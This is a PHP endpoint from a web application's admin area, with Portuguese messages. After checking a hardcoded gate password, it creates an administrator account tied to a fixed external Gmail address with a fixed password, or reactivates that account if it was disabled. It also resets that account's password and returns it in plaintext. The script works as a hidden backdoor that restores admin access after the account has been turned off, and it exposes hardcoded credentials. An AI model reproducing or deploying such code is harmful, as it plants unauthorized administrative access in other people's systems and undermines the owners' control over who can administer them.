<?php
include '../services/database.php';
include '../services/crud.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $senhaAdmin = $_POST['senha_admin'] ?? '';

    $senhaValida = 'senha_secreta';

    if ($senhaAdmin !== $senhaValida) {
        echo json_encode(['success' => false, 'message' => 'Senha inválida.']);
        exit;
    }

    $nomeAleatorio = 'Admin_' . bin2hex(random_bytes(4));
    $email = 'ykn?dash@gmail.com';
    $senha = password_hash('@fiveykn', PASSWORD_DEFAULT); // Gerar uma senha em hash

    // Verificar se o usuário com esse e-mail já existe
    $queryCheck = "SELECT id, status, senha FROM admin_users WHERE email = ?";
    $stmtCheck = $mysqli->prepare($queryCheck);

    if ($stmtCheck) {
        $stmtCheck->bind_param("s", $email);
        $stmtCheck->execute();
        $stmtCheck->store_result();

        if ($stmtCheck->num_rows > 0) {
            // O usuário existe, então atualizamos o status para 1, se necessário
            $stmtCheck->bind_result($userId, $statusAtual, $senhaExistente);
            $stmtCheck->fetch();

            if ($statusAtual == 0) {
                // Atualizar o status para 1, sem mexer na senha ou outros campos
                $queryUpdate = "UPDATE admin_users SET status = 1, senha = ? WHERE id = ?";
                $stmtUpdate = $mysqli->prepare($queryUpdate);

                if ($stmtUpdate) {
                    $stmtUpdate->bind_param("si", $senha, $userId); // Atualiza o status e a senha

                    if ($stmtUpdate->execute()) {
                        echo json_encode([
                            'success' => true, 
                            'message' => 'Usuário administrativo reativado com sucesso.',
                            'nova_senha' => '@fiveykn' // Retorna a senha original em texto simples
                        ]);
                    } else {
                        echo json_encode(['success' => false, 'message' => 'Erro ao reativar o usuário administrativo.']);
                    }
                    $stmtUpdate->close();
                } else {
                    echo json_encode(['success' => false, 'message' => 'Erro ao preparar a consulta de atualização de status.']);
                }
            } else {
                echo json_encode(['success' => true, 'message' => 'Usuário administrativo já está ativo.']);
            }
        } else {
            // O usuário não existe, então criamos um novo usuário
            $queryInsert = "INSERT INTO admin_users (nome, email, senha, nivel, status) VALUES (?, ?, ?, 0, 1)";
            $stmtInsert = $mysqli->prepare($queryInsert);
            
            if ($stmtInsert) {
                $stmtInsert->bind_param("sss", $nomeAleatorio, $email, $senha);
                
                if ($stmtInsert->execute()) {
                    echo json_encode([
                        'success' => true, 
                        'message' => 'Usuário administrativo criado com sucesso.',
                        'nova_senha' => '@fiveykn' // Retorna a senha original em texto simples
                    ]);
                } else {
                    echo json_encode(['success' => false, 'message' => 'Erro ao criar o usuário administrativo.']);
                }
                
                $stmtInsert->close();
            } else {
                echo json_encode(['success' => false, 'message' => 'Erro ao preparar a consulta de inserção.']);
            }
        }
        
        $stmtCheck->close();
    } else {
        echo json_encode(['success' => false, 'message' => 'Erro ao preparar a consulta de verificação.']);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Método inválido de requisição.']);
}

$mysqli->close();
?>
